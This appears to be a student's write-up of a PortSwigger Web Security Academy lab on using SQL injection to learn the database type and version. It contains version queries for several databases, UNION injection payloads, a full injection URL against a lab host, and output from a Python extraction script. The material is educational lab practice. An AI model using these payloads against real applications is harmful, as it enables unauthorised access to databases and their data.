# Examining the database in SQL injection attacks

When exploiting  [SQL injection](https://portswigger.net/web-security/sql-injection)  vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.

## Querying the database type and version

Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:

|     |     |
| --- | --- |
| Database type | Query |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

For example, you could use a  `UNION`  attack with the following input:

`' UNION SELECT @@version--`

This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`

# Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string

#### Hint

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

# PoC
- retrive number of columns using `ORDER BY`. the number of columns is `2`
- in manualy, we can retrive the version of oracle with following payload `https://ac451f281f465491c0091b6d00ff0036.web-security-academy.net/filter?category=Gifts' UNION SELECT 'test', banner FROM v$version--`
```bash
$ python3 sqli_lab_06c.py "https://ac6a1fef1eece449c0e14ad9000b0033.web-security-academy.net"

    >> SQL injection attack, querying the database type and version on Oracle
    >> by Port Swigger Academy

[*]  Retrive dbms version...
[✓]  Found the DBMS version.
[✓]  The dbms version is 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production'
```